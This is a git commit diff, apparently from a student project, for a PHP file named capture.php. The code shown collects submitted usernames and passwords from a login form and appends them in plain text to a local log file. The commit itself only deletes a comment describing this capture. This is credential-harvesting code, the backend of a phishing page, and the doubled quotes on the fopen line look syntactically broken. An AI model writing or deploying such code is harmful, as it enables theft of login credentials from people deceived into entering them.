c481635fac75ba37cfee774181f567ee31b953fb
pierceThrough <186460525+pierceThrough@users.noreply.github.com>
2025-07-08 17:23:54 +0800

    Update capture.php

--- capture.php
+++ capture.php
@@ -2,8 +2,7 @@
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $username = $_POST['username'];
     $password = $_POST['password'];
-
-    // ang data sa nag log in sa site
+    
     $file = fopen(""C:\Users\Students Account\Documents\NetBeansProjects\logs.txt"", "a");
     fwrite($file, "Username: " . $username . "\n");
     fwrite($file, "Password: " . $password . "\n");
